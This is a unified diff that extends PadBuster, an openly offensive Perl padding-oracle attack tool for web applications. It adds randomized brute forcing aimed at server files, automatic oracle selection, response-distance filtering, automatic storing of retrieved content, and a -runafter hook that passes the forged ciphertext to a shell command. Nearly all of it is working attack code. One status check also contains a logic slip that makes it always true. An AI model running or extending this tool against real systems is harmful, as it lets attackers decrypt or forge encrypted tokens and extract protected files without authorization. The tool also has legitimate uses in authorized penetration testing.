@@ -7,7 +7,8 @@
 # techniques and S.Vaudenay for initial discovery of the attack. Credits also
 # to James M. Martin (research@esptl.com) for sharing proof of concept exploit
 # code for performing various brute force attack techniques, and wireghoul (Eldar 
-# Marcussen) for making code quality improvements.  
+# Marcussen) for making code quality improvements. Credits for variuos
+# improvements to GW (gw.2011@tnode.com or http://gw.tnode.com/) - Viris.
 # 
 
 use LWP::UserAgent;
@@ -20,9 +21,11 @@ use Getopt::Long;
 use Time::HiRes qw( gettimeofday );
 use Compress::Zlib;
 use Crypt::SSLeay;
+use File::Basename qw(dirname);
+use File::Path qw(make_path);
 
 # Set defaults with $variable = value
-my $logFiles;
+my $logging;
 my $post;
 my $encoding = 0;
 my $headers;
@@ -37,16 +40,22 @@ my $noEncodeOption;
 my $superVerbose;
 my $proxy;
 my $proxyAuth;
+my $cert;
 my $noIv;
 my $auth;
 my $resumeBlock;
 my $interactive = 0;
 my $bruteForce;
+my $randomize;
 my $ignoreContent;
+my $ignoreDistance;
 my $useBody;
+my $auto;
+my $autoStore;
+my $runAfter;
 my $verbose;
 
-GetOptions( "log" => \$logFiles,
+GetOptions( "log:s" => \$logging,
             "post=s" => \$post,
             "encoding=s" => \$encoding,
             "headers=s" => \$headers,
@@ -56,18 +65,24 @@ GetOptions( "log" => \$logFiles,
             "intermediate=s" => \$intermediaryInput,
             "ciphertext=s" => \$cipherInput,
             "plaintext=s" => \$plainTextInput,
-	    "encodedtext=s" => \$encodedPlainTextInput,
+            "encodedtext=s" => \$encodedPlainTextInput,
             "noencode" => \$noEncodeOption,
             "veryverbose" => \$superVerbose,
             "proxy=s" => \$proxy,
             "proxyauth=s" => \$proxyAuth,
+            "cert=s" => \$cert,
             "noiv" => \$noIv,
             "auth=s" => \$auth,
             "resume=s" => \$resumeBlock,
             "interactive" => \$interactive,
             "bruteforce" => \$bruteForce,
+            "randomize" => \$randomize,
             "ignorecontent" => \$ignoreContent,
+            "ignoredistance=s" => \$ignoreDistance,
             "usebody" => \$useBody,
+            "auto=s" => \$auto,
+            "autostore=s" => \$autoStore,
+            "runafter=s" => \$runAfter,
             "verbose" => \$verbose);
   
 print "\n+-------------------------------------------+\n";
@@ -98,7 +113,7 @@ Options:
          -headers [HTTP Headers]: Custom Headers (name1::value1;name2::value2)
 	 -interactive: Prompt for confirmation on decrypted bytes
 	 -intermediate [Bytes]: Intermediate Bytes for CipherText (Hex-Encoded)
-	 -log: Generate log files (creates folder PadBuster.DDMMYY)
+	 -log [customdir]: Generate log files (creates PadBuster.DDMMYY or customdir)
 	 -noencode: Do not URL-encode the payload (encoded by default)
 	 -noiv: Sample does not include IV (decrypt first block) 
          -plaintext [String]: Plain-Text to Encrypt
@@ -106,8 +121,14 @@ Options:
 	 -prefix [Prefix]: Prefix bytes to append to each sample (Encoded) 
 	 -proxy [address:port]: Use HTTP/S Proxy
 	 -proxyauth [username:password]: Proxy Authentication
+	 -cert [pkcs12:file:pass or pem:crt:key]: HTTPS client certificate
 	 -resume [Block Number]: Resume at this block number
+	 -randomize: Randomize brute force attempts (similar to Web.config bruter)
+	 -ignoredistance [Levenshtein distance]: Ignore responses with smaller distance
 	 -usebody: Use response body content for response analysis phase
+	 -auto [maxrequests]: Automatic decision making and stopping after maxrequests
+	 -autostore [fileprefix]: Automatic storing to files (replaces #ATT, #STAT, #SUM)
+	 -runafter [cmd]: Command to run after finished encryption (replaces #ENC, #DIR)
          -verbose: Be Verbose
          -veryverbose: Be Very Verbose (Debug Only)
          
@@ -127,19 +148,12 @@ if ($url eq "" || $sample eq "" || $blockSize eq "") {
 #$post = "";
 #$sample = "";
 
+my $lwp;
 my $method = $post ? "POST" : "GET";
 
 # These are file related variables
-my $dirName = "PadBuster." . &getTime("F");
-my $dirSlash = "/";
-my $dirCmd = "mkdir ";
-if (defined($ENV{'OS'})) {
- if ($ENV{OS} =~ /Windows/) {
-  $dirSlash = "\\";
-  $dirCmd = "md ";
- }
-}
-my $dirExists = 0;
+my $dirName = ($logging) ? $logging : ("PadBuster." . &getTime("F"));
+my $dirSlash = (defined($ENV{'OS'}) && $ENV{'OS'} =~ /Windows/) ? "\\" : "/";
 my $printStats = 0;
 my $requestTracker = 0;
 my $timeTracker = 0;
@@ -152,6 +166,29 @@ my $encodingFormat = $encoding ? $encoding : 0;
 
 my $encryptedBytes = $sample;
 my $totalRequests = 0;
+my $reqsPerSession = 1000;
+my $retryWait = 10;
+my $retryRepeat = 10;
+my $repeatAutoAnalysis = 5;
+
+if ($cert) {
+	my ($certType, $certFile, $certPass) = split(/:/,$cert);
+	if (lc($certType) eq 'pkcs12') {
+		$ENV{HTTPS_PKCS12_FILE}     = $certFile;
+		if (!$certPass && !$ENV{HTTPS_PKCS12_PASSWORD}) {
+			$certPass = &promptUser("Enter $certType certificate '$certFile' password", "", 2);
+		}
+		if ($certPass) {
+			$ENV{HTTPS_PKCS12_PASSWORD} = $certPass;
+		}
+	} elsif (lc($certType) eq 'pem') {
+		$ENV{HTTPS_CERT_FILE} = $certFile;
+		$ENV{HTTPS_KEY_FILE}  = $certPass;
+	} else {
+		print "\nERROR: Invalid certificate type!";
+		exit();
+	}
+}
 
 # See if the sample needs to be URL decoded, otherwise don't (the plus from B64 will be a problem)
 if ($sample =~ /\%/) {
@@ -188,9 +225,9 @@ my $ivBytes = substr($encryptedBytes, 0, $blockSize);
 
 # Declare some optional elements for storing the results of the first test iteration
 # to help the user if they don't know what the padding error looks like
-my @oracleCantidates;
-my $oracleSignature = "";
 my %oracleGuesses;
+my %oracleCandidates;
+my @oracleSignatures = ();
 my %responseFileBuffer;
 
 # The block count should be the sample divided by the blocksize
@@ -241,16 +278,27 @@ if ($bruteForce) {
 	 while ($complete == 0) {
 	  my $repeat = 0;
 	  for my $b (0 ... 255) {
-  	   $bfAttempts++;  	   
+  	   $bfAttempts++;
+	   if($auto && $bfAttempts > $auto) {
+		   myPrint("\nStopping after reaching maximal number of requests ($bfAttempts)\n",0);
+		   goto ENDBFLOOP;
+	   }
   	   if ( $resumeBlock && ($bfAttempts < ($resumeBlock - ($resumeBlock % 256)+1)) ) {
 		   #SKIP
 	   } else {
-		   my $testBytes = chr($b).$testVal;
-		   $testBytes .= "\x00" x ($blockSize-3);
+		   my $testBytes;
+		   if($#oracleSignatures >= 0 && $randomize || $#oracleSignatures < 0 && $printStats > 0) {
+				$testBytes = '';
+				for (1 .. $blockSize) {
+					$testBytes .= chr(int(rand(256)));
+				}
+			} else {
+				$testBytes = chr($b).$testVal;
+				$testBytes .= "\x00" x ($blockSize-3);
+			}
 
-		   my $combinedBf = $testBytes;  
-		   $combinedBf .= $encryptedBytes;
-		   $combinedBf = &myEncode($combinedBf, $encoding);
+		   my $combinedBf = $testBytes . $encryptedBytes;
+		   $combinedBf = &myEncode($combinedBf, $encodingFormat);
 
 		   # Add the Query String to the URL
 		   my ($testUrl, $testPost, $testCookies) = &prepRequest($url, $post, $cookie, $sample, $combinedBf);  	  
@@ -259,32 +307,57 @@ if ($bruteForce) {
 		   # Issue the request
 		   my ($status, $content, $location, $contentLength) = &makeRequest($method, $testUrl, $testPost, $testCookies);
 
-		   my $signatureData = "$status\t$contentLength\t$location";
-		   $signatureData = "$status\t$contentLength\t$location\t$content" if $useBody;
+		   my $signatureData = ($useBody) ? "$status\t$contentLength\t$location\t$content" : "$status\t$contentLength\t$location";
 
-		   if ($oracleSignature eq "") {
+		   if ($#oracleSignatures < 0) {
 			&myPrint("[+] Starting response analysis...\n",0) if ($b ==0);
 			$oracleGuesses{$signatureData}++;
+			$oracleCandidates{$signatureData} = $content;
 			$responseFileBuffer{$signatureData} = "Status: $status\nLocation: $location\nContent-Length: $contentLength\nContent:\n$content";
 			if ($b == 255) {
-				&myPrint("*** Response Analysis Complete ***\n",0);
-				&determineSignature();
-				$printStats = 1;
+				if (!$auto || $printStats >= $repeatAutoAnalysis) {
+					&myPrint("*** Response Analysis Complete ***\n",0);
+					&determineSignature();
+				}
+				$printStats++;
 				$timeTracker = 0;
 				$requestTracker = 0;
 				$repeat = 1;
 				$bfAttempts = 0;
 			}
 		   }
-		   if ($oracleSignature ne "" && $oracleSignature ne $signatureData) {
-			&myPrint("\nAttempt $bfAttempts - Status: $status - Content Length: $contentLength\n$testUrl\n",0);
-			&writeFile("Brute_Force_Attempt_".$bfAttempts.".txt", "URL: $testUrl\nPost Data: $testPost\nCookies: $testCookies\n\nStatus: $status\nLocation: $location\nContent-Length: $contentLength\nContent:\n$content");
+		   if ($#oracleSignatures >= 0 && !grep {$signatureData eq $_} @oracleSignatures) {
+			my $contentRealLength = length($content);
+			my $distance = &levenshtein($content, $oracleCandidates{$oracleSignatures[0]});
+			my $strAttempt;
+			if ($status >= 300 || $status < 400) {
+				$strAttempt = "Attempt $bfAttempts - Status: $status - Content Length: $contentLength ($contentRealLength) - Distance: $distance - Location: $location\n$testUrl\n";
+			} else {
+				$strAttempt = "Attempt $bfAttempts - Status: $status - Content Length: $contentLength ($contentRealLength) - Distance: $distance\n$testUrl\n";
+			}
+			if (!$ignoreDistance || $distance > $ignoreDistance) {
+				&myPrint($strAttempt,0);
+				&writeFile("Summary.txt", "# $strAttempt");
+				if ($autoStore) {
+					my $filename = "$autoStore";
+					my $chksum = unpack( '%32A*', $content );
+					if (!(($filename =~ s/#ATT/$bfAttempts/g) | ($filename =~ s/#STAT/$status/g) | ($filename =~ s/#SUM/$chksum/g))) {
+						goto ENDBFLOOP;  # Finish after storing to a static filename
+					}
+					make_path(dirname($filename));
+					open(OUTFILE, ">$filename") or die "ERROR: Can't write to file $filename\n";
+					print OUTFILE $content;
+					close(OUTFILE);
+				}
+			}
+			&writeFile("Brute_Force_Attempt_".$bfAttempts.".txt", "URL: $testUrl\nPost Data: $testPost\nCookies: $testCookies\n\nStatus: $status\nLocation: $location\nContent-Length: $contentLength ($contentRealLength)\nDistance: $distance\nContent:\n$content");
 		   }
 	   }
 	  }
 	  ($repeat == 1) ? ($complete = 0) : ($complete = 1);
 	 } 
-	}  
+	}
+ENDBFLOOP:
 } elsif ($plainTextInput) {
 	# ENCRYPT MODE
 	&myPrint("INFO: Starting PadBuster Encrypt Mode",0);
@@ -303,7 +376,7 @@ if ($bruteForce) {
 	$forgedBytes = $cipherInput ? &myDecode($cipherInput,1) : "\x00" x $blockSize;
 	my $sampleBytes = $forgedBytes;
 	
-	for (my $blockNum = $blockCount; $blockNum > 0; $blockNum--) { 	
+	for (my $blockNum = $blockCount; $blockNum > 0; $blockNum--) {
 		# IntermediaryBytes is where the intermediate bytes produced by the algorithm are stored
 		my $intermediaryBytes;
 		
@@ -336,7 +409,7 @@ if ($bruteForce) {
 	}
 	
 	# Assume that the IV is included in our sample and that the first block is the IV	
-	for (my $blockNum = ($resumeBlock+1); $blockNum <= $blockCount; $blockNum++) { 
+	for (my $blockNum = ($resumeBlock+1); $blockNum <= $blockCount; $blockNum++) {
 		# Since the IV is the first block, our block count is artificially inflated by one
 		&myPrint("*** Starting Block ".($blockNum-1)." of ".($blockCount-1)." ***\n",0);
 		
@@ -365,8 +438,32 @@ if ($bruteForce) {
 &myPrint("-------------------------------------------------------",0);	
 &myPrint("** Finished ***\n", 0);
 if ($plainTextInput) {
-	&myPrint("[+] Encrypted value is: ".&uri_escape($forgedBytes),0);
-} else {	
+	if (! $noEncodeOption) {
+		$forgedBytes = &uri_escape($forgedBytes);
+	}
+	&myPrint("[+] Encrypted value is: $forgedBytes\n",0);
+
+	if($runAfter) {
+		&myPrint("-------------------------------------------------------\n",0);	
+		$runAfter =~ s/#ENC/$forgedBytes/g;
+		$runAfter =~ s/#DIR/$dirName/g;
+		if (open(FILE, "<", "/proc/$$/cmdline")) {
+			my $cmdline = <FILE>;
+			$cmdline =~ s/\x00/ '/;
+			$cmdline =~ s/\x00/' '/g;
+			$cmdline =~ s/ '$//;
+			close(FILE);
+			&myPrint("Pri: $cmdline",0);
+			&writeFile("Summary.txt", "\n$cmdline\n");
+		}
+		&myPrint("Run: $runAfter",0);
+		&writeFile("Summary.txt", "$runAfter\n\n");
+		&myPrint("-------------------------------------------------------\n",0);	
+		my $ret = system($runAfter);
+		&myPrint("-------------------------------------------------------\n",0);	
+		&myPrint("Exit $ret from: $runAfter",0);
+	}
+} elsif (defined($plainTextBytes)) {	
 	&myPrint("[+] Decrypted value (ASCII): $plainTextBytes\n",0);
 	&myPrint("[+] Decrypted value (HEX): ".&myEncode($plainTextBytes,2)."\n", 0);
 	&myPrint("[+] Decrypted value (Base64): ".&myEncode($plainTextBytes,0)."\n", 0);
@@ -384,7 +481,7 @@ sub determineSignature {
 	&myPrint("-------------------------------------------------------",0);
 	if ($useBody) {
 		&myPrint("ID#\tFreq\tStatus\tLength\tChksum\tLocation",0);
-	} else 	{
+	} else {
 		&myPrint("ID#\tFreq\tStatus\tLength\tLocation",0);
 	}
 	&myPrint("-------------------------------------------------------",0);
@@ -393,7 +490,7 @@ sub determineSignature {
 
 	foreach (@sortedGuesses) {
 		my $line = $id;
-		($id == $#sortedGuesses+1 && $#sortedGuesses != 0) ? $line.= " **" : $line.="";
+		($id == $#sortedGuesses+1 && $#sortedGuesses != 0) ? $line.=" **" : $line.="";
 		my @sigFields = split("\t", $_);
 		$line .= "\t$oracleGuesses{$_}\t$sigFields[0]\t$sigFields[1]";
 		$useBody ? ( $line .= "\t".unpack( '%32A*', $sigFields[3] ) ) : $line.="";
@@ -409,9 +506,22 @@ sub determineSignature {
 		&myPrint("Double check the Block Size and try again.",0);
 		exit();
 	} else {
-		my $responseNum = &promptUser("\nEnter an ID that matches the error condition\nNOTE: The ID# marked with ** is recommended");
-		&myPrint("\nContinuing test with selection $responseNum\n",0);
-		$oracleSignature = $sortedGuesses[$responseNum-1];
+		my @oracleNums;
+		if ($auto) {
+			if ($bruteForce) {
+			    @oracleNums =1..($#sortedGuesses+1);  # Auto select all
+			} else {
+			    @oracleNums =($#sortedGuesses+1);  # Auto select recommended
+			}
+		} else {
+		    @oracleNums =split(/[,\s]+/, &promptUser("\nEnter a comma separated list of IDs that match the error condition\nNOTE: The ID# marked with ** is recommended",''));
+		}
+		for (@oracleNums) {
+			push(@oracleSignatures, $sortedGuesses[$_-1]);
+		}
+		if($#oracleSignatures >= 0) {
+			&myPrint("\nContinuing test with selection [@oracleNums]\n",0);
+		}
 	}
 }
 
@@ -427,7 +537,7 @@ sub prepRequest {
 		$wasSampleFound = 1;
 	} 
 
-	my $testPost = "";						
+	my $testPost = "";
 	if ($pPost) {
 		$testPost = $pPost;
 		if ($pPost =~ /$pSample/) {
@@ -454,9 +564,9 @@ sub prepRequest {
 
 sub processBlock {
   	my ($sampleBytes) = @_; 
-  	my $analysisMode;
+  	
   	# Analysis mode is either 0 (response analysis) or 1 (exploit)  	
-  	$analysisMode = (!$error && $oracleSignature eq "") ? 0 : 1;
+  	my $analysisMode = (!$error && $#oracleSignatures < 0) ? 0 : 1;
   	
   	# The return value of this subroutine is the intermediate text for the block
 	my $returnValue;
@@ -480,7 +590,7 @@ sub processBlock {
 		OUTERLOOP:
 		for (my $byteNum = $blockSize - 1; $byteNum >= 0; $byteNum--) {
 			INNERLOOP:
-			for (my $i = 255; $i >= 0; $i--) {			
+			for (my $i = 255; $i >= 0; $i--) {
 				# Fuzz the test byte
 				substr($testBytes, $byteNum, 1, chr($i));
 
@@ -491,7 +601,7 @@ sub processBlock {
 					$combinedTestBytes = &myDecode($prefix,$encodingFormat).$combinedTestBytes 
 				}
 
-				$combinedTestBytes = &myEncode($combinedTestBytes, $encodingFormat);				
+				$combinedTestBytes = &myEncode($combinedTestBytes, $encodingFormat);
 				chomp($combinedTestBytes);
 
 				if (! $noEncodeOption) {
@@ -505,8 +615,7 @@ sub processBlock {
 				my ($status, $content, $location, $contentLength) = &makeRequest($method, $testUrl, $testPost, $testCookies);
 
 				
-				my $signatureData = "$status\t$contentLength\t$location";
-				$signatureData = "$status\t$contentLength\t$location\t$content" if $useBody;
+				my $signatureData = ($useBody) ? "$status\t$contentLength\t$location\t$content" : "$status\t$contentLength\t$location";
 				
 				# If this is the first block and there is no padding error message defined, then cycle through 
 				# all possible requests and let the user decide what the padding error behavior is.
@@ -527,9 +636,9 @@ sub processBlock {
 
 				my $continue = "y";
 
-				if (($error && $content !~ /$error/) || ($oracleSignature ne "" && $oracleSignature ne $signatureData)) {
+				if (($error && $content !~ /$error/) || ($#oracleSignatures >= 0 && !grep {$signatureData eq $_} @oracleSignatures)) {
 					# This is for autoretry logic (only works on the first byte)
-					if ($autoRetry == 1 &&  ($byteNum == ($blockSize - 1) ) && $hasHit == 0 ) {
+					if ($autoRetry > 0 &&  ($byteNum == ($blockSize - 1) ) && $hasHit == 0 ) {
 						$hasHit++;
 					} else {
 						# If there was no padding error, then it worked
@@ -579,9 +688,10 @@ sub processBlock {
 					# End of the road with no success.  We should probably try again.
 					&myPrint("ERROR: No matching response on [Byte ".($byteNum+1)."]",0);
 
-					if ($autoRetry == 0) {
-						$autoRetry = 1;
-						&myPrint("       Automatically trying one more time...",0);
+					if ($autoRetry < $retryRepeat) {
+						&myPrint("       Automatically trying ".($retryRepeat-$autoRetry)." more times...",0);
+  						sleep $retryWait;
+						$autoRetry++;
 						$repeat = 1;
 						last OUTERLOOP;
 						
@@ -593,11 +703,13 @@ sub processBlock {
 
 						$continue = &promptUser("Do you want to start this block over? (Yes/No)? [y/n/a]","",1);
 						if ($continue ne "n") {
-							&myPrint("INFO: Switching to interactive mode",0);
-							$interactive = 1;
+							if ($continue ne "a") {
+								&myPrint("INFO: Switching to interactive mode",0);
+								$interactive = 1;
+							}
 							$repeat = 1;
 							last OUTERLOOP;
-						}					
+						}
 					}
 				}   
 				if ($falsePositiveDetector == $blockSize) {
@@ -611,9 +723,11 @@ sub processBlock {
 						&myPrint("[+] instead of the automated response analysis.\n",0);
 					}
 					$continue = &promptUser("Do you want to start this block over? (Yes/No)? [y/n/a]","",1);
-					if ($continue eq "y") {
-						&myPrint("INFO: Switching to interactive mode",0);
-						$interactive = 1;
+					if ($continue ne "n") {
+						if ($continue ne "a") {
+							&myPrint("INFO: Switching to interactive mode",0);
+							$interactive = 1;
+						}
 						$repeat = 1;
 						last OUTERLOOP;
 					}
@@ -628,7 +742,7 @@ sub processBlock {
 sub makeRequest {
  
  my ($method, $url, $data, $cookie) = @_; 
- my ($noConnect, $lwp, $status, $content, $req, $location, $contentLength);   
+ my ($noConnect, $status, $content, $req, $location, $contentLength);   
  my $numRetries = 0;
  $data ='' unless $data;
  $cookie='' unless $cookie;
@@ -638,11 +752,23 @@ sub makeRequest {
   #Quick hack to avoid hostname in URL when using a proxy with SSL (this will get re-set later if needed)
   $ENV{HTTPS_PROXY} = "";
   
-  $lwp = LWP::UserAgent->new(env_proxy => 1,
-                            keep_alive => 1,
-                            timeout => 30,
-			    requests_redirectable => [],
-                            );
+  if(!$lwp || ($totalRequests % $reqsPerSession) == 0) {
+    sleep $retryWait;
+    $lwp = LWP::UserAgent->new(env_proxy => 1, keep_alive => 1, timeout => 60, requests_redirectable => []);
+
+    if ($proxy) {
+  	  my $proxyUrl = "http://";
+  	  if ($proxyAuth) {
+ 		my ($proxyUser, $proxyPass) = split(":",$proxyAuth);
+ 		$ENV{HTTPS_PROXY_USERNAME} = $proxyUser;
+		$ENV{HTTPS_PROXY_PASSWORD} = $proxyPass;
+		$proxyUrl .= $proxyAuth."@";
+ 	  }
+ 	  $proxyUrl .= $proxy;
+ 	  $lwp->proxy(['http'], "http://".$proxy);
+	  $ENV{HTTPS_PROXY} = "http://".$proxy;
+    }
+  }
  
   $req = new HTTP::Request $method => $url;
 
@@ -653,19 +779,6 @@ sub makeRequest {
    $req->content_type('application/x-www-form-urlencoded');
    $req->content($data);
   }
- 
-  if ($proxy) {
-  	my $proxyUrl = "http://";
-  	if ($proxyAuth) {
- 		my ($proxyUser, $proxyPass) = split(":",$proxyAuth);
- 		$ENV{HTTPS_PROXY_USERNAME}	= $proxyUser;
-		$ENV{HTTPS_PROXY_PASSWORD}	= $proxyPass;
-		$proxyUrl .= $proxyAuth."@";
- 	}
- 	$proxyUrl .= $proxy;
- 	$lwp->proxy(['http'], "http://".$proxy);
-	$ENV{HTTPS_PROXY} = "http://".$proxy;
-  } 	
 
 
   if ($auth) {
@@ -691,7 +804,7 @@ sub makeRequest {
   my $endTime = &gettimeofday();  
   $timeTracker = $timeTracker + ($endTime - $startTime);
   
-  if ($printStats == 1 && $requestTracker % 250 == 0) {
+  if ($printStats == 1 && $requestTracker % 500 == 0) {
   	print "[+] $requestTracker Requests Issued (Avg Request Time: ".(sprintf "%.3f", $timeTracker/100).")\n";
   	$timeTracker = 0;
   }
@@ -701,39 +814,42 @@ sub makeRequest {
   $status = substr($response->status_line, 0, 3);
   $content = $response->content;
  
-  &myPrint("Response Content:\n$content",0) if $superVerbose;
   $location = $response->header("Location");
-  if (!$location)   {
-   $location = "N/A";
-  }
-  #$contentLength = $response->header("Content-Length");
-  $contentLength = length($content);
+  $contentLength = $response->header("Content-Length");
+  #$contentLength = length($content);
   
   
   my $contentEncoding = $response->header("Content-Encoding");
   if ($contentEncoding) {
-   if ($contentEncoding =~ /GZIP/i ) {
-    	$content = Compress::Zlib::memGunzip($content);
-  	$contentLength = length($content);
-   }
+    if ($contentEncoding =~ /GZIP/i ) {
+      $content = Compress::Zlib::memGunzip($content);
+      $contentLength = length($content);
+    }
   }
+  &myPrint("Response Content:\n$content",0) if $superVerbose;
   
   my $statusMsg = $response->status_line;
   #myPrint("Status: $statusMsg, Location: $location, Length: $contentLength",1); 
  
-  if ($statusMsg =~ /Can't connect/) {
-   print "ERROR: $statusMsg\n   Retrying in 10 seconds...\n\n";
+  #eg: Status: 500 Can't connect to example.com:81 (connect: Connection timed out), Location: N/A, Length:
+  #eg: Status: 500 Server closed connection without sending any data back, Location: N/A, Length:
+  if (!defined($location) && !defined($contentLength) && $status eq '500') {
+   print "ERROR: $statusMsg\n   Retrying in $retryWait seconds...\n\n";
    $noConnect = 1;
    $numRetries++;
-   sleep 10;
+   $lwp = undef;
+   sleep $retryWait;
   } else {
    $noConnect = 0;
    $totalRequests++;
   }  
- } until (($noConnect == 0) || ($numRetries >= 15));
- if ($numRetries >= 15) {
-  &myPrint("ERROR: Number of retries has exceeded 15 attempts...quitting.\n",0);
+ } until (($noConnect == 0) || ($numRetries >= $retryRepeat));
+ if ($numRetries >= $retryRepeat) {
+  &myPrint("ERROR: Number of retries has exceeded $retryRepeat attempts...quitting.\n",0);
   exit;
+ }
+ if (!$location) {
+   $location = "N/A";
  }
  return ($status, $content, $location, $contentLength);
 }
@@ -789,7 +905,7 @@ sub encodeDecode {
     if ($oper == 1) {
  	$returnVal = &web64Decode($toEncodeDecode,0);
     } else {
- 	$returnVal = &web64Encode($toEncodeDecode,0);
+    $returnVal = &web64Encode($toEncodeDecode,0);
     } 
  } else {
     # B64
@@ -832,20 +948,23 @@ sub web64Decode {
 
 
 sub promptUser {
- my($prompt, $default, $yn) = @_;
+ my($prompt, $default, $type) = @_;
+ $type = -1  if(!defined($type));
  my $defaultValue = $default ? "[$default]" : "";
  print "$prompt $defaultValue: ";
  chomp(my $input = <STDIN>);
  
  $input = $input ? $input : $default;
- if ($yn) {
+ if ($type == 1) {
   if ($input =~ /^y|n|a$/) {
    return $input;
   } else {
-   &promptUser($prompt, $default, $yn);
+   &promptUser($prompt, $default, $type);
   }
+ } elsif ($type == 2) {
+  return $input;
  } else {
-  if ($input =~ /^-?\d/ && $input > 0 && $input < 256) {
+  if ($input =~ /^\d+(,\d+)+$/ || $input =~ /^-?\d+$/ && $input > 0 && $input < 256 || $input eq $default) {
    return $input;
   } else {
    &promptUser($prompt, $default);
@@ -855,13 +974,10 @@ sub promptUser {
 
 sub writeFile {
  my ($fileName, $fileContent) = @_;
- if ($logFiles) {
-  if ($dirExists != 1) {
-   system($dirCmd." ".$dirName);
-   $dirExists = 1;
-  }
+ if (defined($logging)) {
   $fileName = $dirName.$dirSlash.$fileName;
-  open(my $OUTFILE, '>>', $fileName) or die "ERROR: Can't write to file $fileName\n";
+  make_path(dirname($fileName));
+  open(my $OUTFILE, ">>$fileName") or die "ERROR: Can't write to file $fileName\n";
   print $OUTFILE $fileContent;
   close($OUTFILE);
  }
@@ -885,5 +1001,32 @@ sub getTime {
  } else {
   return $hour.":".$minute.":".$second;
  }
+}
+
+# Levenshtein distance (also called edit distance) between two strings
+sub levenshtein($$){
+  my @A=split //, lc shift;
+  my @B=split //, lc shift;
+  my @W=(0..@B);
+  my ($i, $j, $cur, $next);
+  for $i (0..$#A){
+	$cur=$i+1;
+	for $j (0..$#B){
+		$next=min(
+			$W[$j+1]+1,
+			$cur+1,
+			($A[$i] ne $B[$j])+$W[$j]
+		);
+		$W[$j]=$cur;
+		$cur=$next;
+	}
+	$W[@B]=$next;
+  }
+  return $next;
+}
+
+sub min($$$){
+  if ($_[0] < $_[2]){ pop @_; } else { shift @_; }
+  return $_[0] < $_[1]? $_[0]:$_[1];
 }
 
